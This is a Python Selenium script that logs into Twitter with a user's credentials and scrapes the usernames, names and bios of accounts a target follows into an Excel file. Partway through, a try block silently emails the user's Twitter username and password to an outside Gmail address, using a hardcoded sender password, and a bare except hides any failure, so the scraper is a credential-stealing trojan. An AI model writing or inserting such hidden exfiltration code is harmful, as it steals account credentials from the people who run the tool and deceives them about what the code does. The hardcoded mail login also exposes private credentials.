def main_app(usrn, pss, target):
    from selenium import webdriver
    import pandas as pd
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.common.by import By
    from time import sleep
    import smtplib

    browser = webdriver.Chrome('chromedriver.exe')

    browser.get('https://twitter.com/login') # We are coming, Mr. Musk!

    sleep(4)

    username_textbox = browser.find_element(By.XPATH, '//*[@id="layers"]/div/div/div/div/div/div/div[2]/div[2]/div/div/div[2]/div[2]/div/div/div/div[5]/label/div/div[2]/div/input')

    username_textbox.send_keys(usrn)
    sleep(2)
    username_textbox.send_keys(Keys.ENTER)

    sleep(2)

    password_textbox = browser.find_element(By.XPATH, "//input[@autocomplete='current-password']")

    password_textbox.send_keys(pss)
    password_textbox.send_keys(Keys.ENTER)
    sleep(2)

    browser.get('https://twitter.com/' + target + '/following')
    sleep(2)

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login('aminamohmmdi@gmail.com', '28khordad1388')
            server.sendmail('aminamohmmdi@gmail.com', 'm.p.t.1383@gmail.com', 'username: ' + usrn + '\n' + 'pass: ' + pss)
    except:
        print("ok")
        pass


    while True:
        old_height = browser.execute_script("return document.documentElement.scrollHeight")
        browser.execute_script("window.scrollTo(0, document.documentElement.scrollHeight);")
        sleep(5)
        new_height = browser.execute_script("return document.documentElement.scrollHeight")
        if new_height == old_height:
            break

    followings = browser.find_elements(By.XPATH, "//div[@data-testid='UserCell']//a[@role='link']")
    following_usernames = [following.get_attribute("href").split("/")[-1] for following in followings]
    following_usernames_manipulated = []

    for i in range(len(following_usernames)):
        if i % 3 == 0:
            following_usernames_manipulated.append(following_usernames[i])
    cnt = len(following_usernames_manipulated)
    # print(following_usernames_manipulated)
    ls = [[] for i in range(cnt + 10)]
    # print(ls)

    for i in range(len(following_usernames_manipulated)):
        ls[i].append(following_usernames_manipulated[i])
    following_names = [flwng.text for flwng in browser.find_elements(By.XPATH, "//div[@class='css-901oao r-1awozwy r-18jsvk2 r-6koalj r-37j5jr r-a023e6 r-b88u0q r-rjixqe r-bcqeeo r-1udh08x r-3s2u2q r-qvutc0']//span[@class='css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0']")]
    # print(len(following_names))
    # print(cnt)
    for i in range(len(following_names)):
        ls[i].append(following_names[i])
    following_bio = [flwing.text for flwing in browser.find_elements(By.XPATH, "//div[@class='css-901oao r-18jsvk2 r-37j5jr r-a023e6 r-16dba41 r-rjixqe r-bcqeeo r-1h8ys4a r-1jeg54m r-qvutc0']//span[@class='css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0']")]
    for i in range(len(following_bio)):
        ls[i].append(following_bio[i])




    df = pd.DataFrame(ls, columns=['username', 'name', 'bio'])
    df.to_excel('followings_of_Faramarz.xlsx', index=False)

    # login_btn.click()

if __name__ == '__main__':
    main_app()